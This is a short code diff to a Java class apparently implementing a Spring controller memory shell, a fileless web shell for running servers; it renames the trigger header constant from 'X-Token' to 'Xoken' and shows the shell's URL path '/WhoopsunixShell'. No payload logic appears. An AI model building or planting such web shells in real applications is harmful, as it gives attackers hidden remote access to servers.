@@ -24,7 +24,7 @@ import java.util.Map;
 public class SpringControllerMemShell {
     private static String PATTERN = "/WhoopsunixShell";
     private static String NAME = "Whoopsunix";
-    private static String HEADER = "X-Token";
+    private static String HEADER = "Xoken";
 
     public SpringControllerMemShell(String s) {
     }
